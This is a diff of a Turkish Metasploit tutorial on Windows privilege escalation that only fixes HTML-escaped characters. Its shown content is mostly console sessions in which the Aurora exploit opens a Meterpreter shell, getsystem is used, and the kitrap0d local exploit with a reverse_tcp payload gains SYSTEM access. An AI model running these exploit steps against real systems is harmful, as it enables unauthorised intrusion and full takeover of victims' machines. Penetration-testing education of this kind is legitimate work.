@@ -42,17 +42,17 @@ Aşağıdaki örnekte görüldüğü gibi, hedef sistemde `ms10_002_aurora` mod�
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** **&gt;**
+msf exploit**(**ms10_002_aurora**)** **>**
 **[*********]** Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161
 **[*********]** Sending stage **(**748544 bytes**)** to 192.168.1.161
-**[*********]** Meterpreter session 3 opened **(**192.168.1.71:38699 -&gt; 192.168.1.161:4444**)** at 2010-08-21 13:39:10 -0600
+**[*********]** Meterpreter session 3 opened **(**192.168.1.71:38699 -> 192.168.1.161:4444**)** at 2010-08-21 13:39:10 -0600
 
-msf exploit**(**ms10_002_aurora**)** **&gt;** sessions -i 3
+msf exploit**(**ms10_002_aurora**)** **>** sessions -i 3
 **[*********]** Starting interaction with 3...
 
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: XEN-XP-SP2-BARE\victim
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -65,9 +65,9 @@ meterpreter **&gt;**
 
 
 ```bash
-meterpreter **&gt;** use priv
+meterpreter **>** use priv
 Loading extension priv...success.
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -76,7 +76,7 @@ meterpreter **&gt;**
 
 
 
-``sh meterpreter &gt; getsystem -h Usage: getsystem [options]
+``sh meterpreter > getsystem -h Usage: getsystem [options]
 
 
 
@@ -89,7 +89,7 @@ OPTIONS:
 
 ```bash
 -h        Help Banner.
--t &lt;opt&gt;  The technique to use. (Default to '0').
+-t <opt>  The technique to use. (Default to '0').
 0 : All techniques available
 1 : Service - Named Pipe Impersonation (In Memory/Admin)
 2 : Service - Named Pipe Impersonation (Dropper/Admin)
@@ -98,7 +98,7 @@ OPTIONS:
 
 
 
-meterpreter &gt;
+meterpreter >
 
 
 ```bash
@@ -107,11 +107,11 @@ meterpreter &gt;
 ``` komutuna hiçbir parametre vermezseniz, varsayılan olarak tüm ihtimalleri deneyecektir. 
 
 ```sh
-meterpreter &gt; getsystem
+meterpreter > getsystem
 ...got system (via technique 1).
-meterpreter &gt; getuid
+meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
-meterpreter &gt;
+meterpreter >
 ```
 
 
@@ -124,9 +124,9 @@ Bazı durumlarda `getsystem` başarısız olur. Aşağıda bunun örneğini gör
 
 
 ```bash
-meterpreter **&gt;** getsystem
+meterpreter **>** getsystem
 **[**-] priv_elevate_getsystem: Operation failed: Access is denied.
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -135,9 +135,9 @@ Yukarıda başarısız olmuş bir `getsystem` komutu çıktısı görülüyor. �
 
 
 ```bash
-meterpreter **&gt;** background
+meterpreter **>** background
 **[*********]** Backgrounding session 1...
-msf exploit**(**ms10_002_aurora**)** **&gt;** use exploit/windows/local/
+msf exploit**(**ms10_002_aurora**)** **>** use exploit/windows/local/
 ...snip...
 use exploit/windows/local/bypassuac
 use exploit/windows/local/bypassuac_injection
@@ -148,7 +148,7 @@ use exploit/windows/local/ms11_080_afdjoinleaf
 use exploit/windows/local/ms13_005_hwnd_broadcast
 use exploit/windows/local/ms13_081_track_popup_menu
 ...snip...
-msf exploit**(**ms10_002_aurora**)** **&gt;**
+msf exploit**(**ms10_002_aurora**)** **>**
 ```
 
 
@@ -157,12 +157,12 @@ Bu listedeki modüllerden `exploit/windows/local/ms10_015_kitrap0d` modülünü 
 
 
 ```bash
-msf exploit**(**ms10_002_aurora**)** **&gt;** use exploit/windows/local/ms10_015_kitrap0d
-msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set SESSION 1
-msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set PAYLOAD windows/meterpreter/reverse_tcp
-msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set LHOST 192.168.1.161
-msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set LPORT 4443
-msf exploit**(**ms10_015_kitrap0d**)** **&gt;** show options
+msf exploit**(**ms10_002_aurora**)** **>** use exploit/windows/local/ms10_015_kitrap0d
+msf exploit**(**ms10_015_kitrap0d**)** **>** set SESSION 1
+msf exploit**(**ms10_015_kitrap0d**)** **>** set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit**(**ms10_015_kitrap0d**)** **>** set LHOST 192.168.1.161
+msf exploit**(**ms10_015_kitrap0d**)** **>** set LPORT 4443
+msf exploit**(**ms10_015_kitrap0d**)** **>** show options
 
 Module options **(**exploit/windows/local/ms10_015_kitrap0d**)**:
 
@@ -187,7 +187,7 @@ Exploit target:
    0   Windows 2K SP4 - Windows 7 **(**x86**)**
 
 
-msf exploit**(**ms10_015_kitrap0d**)** **&gt;** exploit
+msf exploit**(**ms10_015_kitrap0d**)** **>** exploit
 
 **[*********]**  Started reverse handler on 192.168.1.161:4443 
 **[*********]**  Launching notepad to host the exploit...
@@ -198,7 +198,7 @@ msf exploit**(**ms10_015_kitrap0d**)** **&gt;** exploit
 **[*********]**  Payload injected. Executing exploit...
 **[**+]  Exploit finished, wait **for** **(**hopefully privileged**)** payload execution to complete.
 **[*********]**  Sending stage **(**769024 bytes**)** to 192.168.1.71
-**[*********]**  Meterpreter session 2 opened **(**192.168.1.161:4443 -&gt; 192.168.1.71:49204**)** at 2014-03-11 11:14:00 -0400
+**[*********]**  Meterpreter session 2 opened **(**192.168.1.161:4443 -> 192.168.1.71:49204**)** at 2014-03-11 11:14:00 -0400
 ```
 
 
@@ -207,6 +207,6 @@ Gerekli modül ve payload ayarlarını yaptıktan sonra çalıştırılan exploi
 
 
 ```bash
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: NT AUTHORITY\SYSTEM
-meterpreter **&gt;**```
+meterpreter **>**```
